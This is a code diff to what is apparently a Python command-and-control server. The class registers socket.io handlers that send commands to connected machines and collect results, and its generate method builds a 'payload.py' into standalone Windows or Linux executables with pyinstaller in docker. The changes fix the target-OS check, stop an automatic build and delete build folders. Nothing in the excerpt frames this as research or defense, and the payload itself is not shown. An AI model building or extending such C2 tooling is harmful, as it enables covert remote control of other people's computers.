@@ -5,6 +5,7 @@ import platform
 import base64
 import zlib
 import marshal
+import uuid
 
 class C2:
     def __init__(self, sio):
@@ -19,7 +20,7 @@ class C2:
         self.sio.on('disconnect', self.on_disconect)
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
-        self.generate("Windows")
+
 
 
     def on_connect(self, sid, data):
@@ -148,12 +149,16 @@ requests==2.32.3""")
         if system == generate:
             print("just pyinstaller")
 
-        elif system == "Windows":
+        elif generate == "Windows":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F payload.py"', shell=True, capture_output=True)
             print(result)
 
-        elif system == "Darwin" or "Linux":
+        elif generate == "Darwin" or "Linux":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F payload.py"', shell=True, capture_output=True)
             print(result)
+
+        
+        os.remove("__pycache__")
+        os.remove("build")
         
         
